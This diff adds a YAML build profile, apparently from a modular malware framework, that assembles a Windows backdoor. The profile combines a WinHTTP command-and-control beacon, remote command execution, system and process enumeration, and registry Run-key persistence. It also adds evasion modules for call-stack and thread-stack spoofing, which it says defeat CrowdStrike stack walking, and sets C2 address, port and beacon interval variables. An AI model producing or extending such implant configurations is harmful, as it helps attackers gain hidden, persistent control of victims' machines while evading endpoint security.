@@ -1,0 +1,29 @@
+name: backdoor_http_stack_spoof
+description: WinHTTP backdoor with call stack + thread stack spoofing — defeats CrowdStrike stack walking
+
+core:
+  - core/emit_buffer
+  - core/file_ops
+
+c2: c2/winhttp_beacon
+
+commands:
+  - commands/cmd_sysinfo
+  - commands/cmd_processes
+  - commands/cmd_exec
+
+arch: arch/backdoor
+persist: persist/registry_run
+
+resources: true
+
+evasion:
+  - evasion/behavioral_pacing
+  - evasion/stack_spoof
+  - evasion/thread_stack_spoof
+  - evasion/iat_pad
+
+vars:
+  C2_IP: "10.0.2.2"
+  C2_PORT: "9001"
+  BEACON_INTERVAL_MS: "10000"
